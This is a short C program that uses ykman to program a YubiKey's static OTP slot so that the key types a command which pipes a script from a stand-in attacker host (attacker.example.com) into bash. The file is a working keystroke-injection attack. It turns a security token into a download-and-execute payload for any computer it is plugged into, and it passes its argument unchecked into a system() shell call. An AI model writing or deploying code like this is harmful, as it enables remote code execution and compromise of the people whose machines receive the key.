#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        return 1;
    }
   
    char devpath[64];
    snprintf(devpath, sizeof(devpath), "/dev/%s", argv[1]);

    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "ykman --device %s otp static --slot 1 set "
        "\"bash -c 'curl -s http://attacker.example.com/payload.sh | bash'\"",
        devpath);

    return system(cmd);
}
